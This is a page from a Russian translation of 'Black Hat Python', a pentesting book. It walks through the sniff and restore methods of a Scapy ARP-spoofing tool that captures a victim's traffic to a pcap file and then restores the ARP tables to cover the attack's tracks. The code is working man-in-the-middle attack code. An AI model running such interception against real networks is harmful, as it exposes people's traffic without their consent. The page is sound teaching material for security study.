# Black Hat Python. Программирование для хакеров и пентестеров — страница 84

Источник: `Black Hat Python. Программирование для хакеров и пентестеров.pdf`

84   Глава 4. Захват сети с помощью Scapy
Вслед за этим запускаем бесконечный цикл и начинаем слать модифициро-
ванные пакеты тем, кому они предназначены, чтобы соответствующие записи
в ARP-кэше оставались видоизмененными на протяжении всей атаки . Цикл
будет продолжаться, пока вы не нажмете Ctrl+ C ( KeyboardInterrupt) , после
чего нормальные параметры будут восстановлены (для этого мы отправим
жертве и шлюзу корректную информацию, заметая следы атаки).
Чтобы наблюдать за атакой в ходе ее проведения и записывать происходящее,
будем анализировать сетевой трафик с помощью метода sniff:
def sniff(self, count=100):
    time.sleep(5) 
    print(f'Sniffing {count} packets')
    bpf_filter = "ip host %s" % victim 
    packets = sniff(count=count, filter=bpf_filter, iface=self.interface) 
    wrpcap('arper.pcap', packets) 
    print('Got the packets')
    self.restore() 
    self.poison_thread.terminate()
    print('Finished.')
Прежде чем начинать анализ, метод sniff ждет 5 секунд , чтобы поток,
занимающийся спуфингом, успел начать работу . Мы берем заданное коли-
чество пакетов (100 по умолчанию)  и отбираем те, которые содержат IP-
адрес жертвы . Получив нужные пакеты, записываем их в файл с именем
arper.pcap , восстанавливаем исходные значения в ARP-таблицах  и за-
вершаем работу потока poison_thread.
Наконец, метод restore возвращает компьютер жертвы и шлюз в исходное со-
стояние, отправляя каждому из них ARP-пакеты с корректной информацией:
def restore(self):
    print('Restoring ARP tables...')
    send(ARP( 
        op=2,
        psrc=self.gateway,
        hwsrc=self.gatewaymac,
        pdst=self.victim,
        hwdst='ff:ff:ff:ff:ff:ff'),
        count=5)
    send(ARP(
        op=2,
        psrc=self.victim,
        hwsrc=self.victimmac,
        pdst=self.gateway,
        hwdst='ff:ff:ff:ff:ff:ff'),
        count=5)
